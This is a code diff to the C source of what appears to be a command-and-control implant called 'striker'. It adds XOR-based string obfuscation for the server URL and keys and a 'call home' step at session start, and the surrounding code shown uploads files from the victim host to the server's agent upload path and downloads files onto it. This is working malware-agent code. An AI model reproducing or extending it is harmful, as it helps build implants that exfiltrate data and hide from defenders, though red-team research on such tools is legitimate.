@@ -7,6 +7,32 @@
 
 #include "striker.h"
 
+// Set to non-zero value for debug outputs.
+#define STRIKER_DEBUG 1
+
+#define URL_SIZE (sizeof(char) * 256)
+char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
+char AUTH_KEY[sizeof(char) * 32] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
+char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]"; // A marker for the key to use for obfuscating strings.
+
+// Max task result size in bytes
+#define MAX_RES_SIZE (sizeof(char) * 102400)
+
+char *obfs_decode(char *str){
+
+  unsigned char key = (unsigned char)atoi(OBFS_KEY);
+  size_t len = strlen(str);
+  unsigned char curr_key;
+  for (int i = 0; i < len; i++){
+    curr_key = key * (i + 1);
+    while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126))
+      curr_key += 47;
+    str[i] = str[i] ^ curr_key;
+    key = curr_key;
+  }
+  return str;
+}
+
 CURL *init_curl(const char *path, buffer *buff){
   
   CURL *curl = curl_easy_init();
@@ -16,7 +42,7 @@ CURL *init_curl(const char *path, buffer *buff){
     exit(EXIT_FAILURE);
   }
   char *url = malloc(URL_SIZE);
-  snprintf(url, URL_SIZE, "%s%s", baseURL, path);
+  snprintf(url, URL_SIZE, "%s%s", BASE_URL, path);
   curl_easy_setopt(curl, CURLOPT_URL, url);
   curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
@@ -150,7 +176,7 @@ void execute_task(session *striker, task *tsk){
       goto complete;
     }
     char *url = malloc(URL_SIZE);
-    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s", baseURL, striker->uid) < 0)
+    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s", BASE_URL, striker->uid) < 0)
       abort();
     upload_file(url, filename, rfo, result_buff);
     fclose(rfo);
@@ -159,7 +185,7 @@ void execute_task(session *striker, task *tsk){
     char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "fileID"));
     char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "name"));
     char *url = malloc(URL_SIZE);
-    if (snprintf(url, URL_SIZE, "%s/agent/download/%s", baseURL, fileID) < 0)
+    if (snprintf(url, URL_SIZE, "%s/agent/download/%s", BASE_URL, fileID) < 0)
       abort();
     char *loc = malloc(PATH_MAX);
     if (snprintf(loc, PATH_MAX, "%s%s", striker->write_dir, name) < 0)
@@ -196,6 +222,13 @@ void execute_task(session *striker, task *tsk){
 
 void start_session(){  
   
+  // Decode some config.
+  obfs_decode(BASE_URL);
+  printf("Calling home to %s...\n", BASE_URL);
+  char testing[] = "[OBFS_ENC]This is protected string!";
+  obfs_decode(testing);
+  printf("%s\n", testing);
+
   // Default session setup.
   session *striker = malloc(sizeof(session));
   striker->uid = malloc(sizeof(char) * 32);
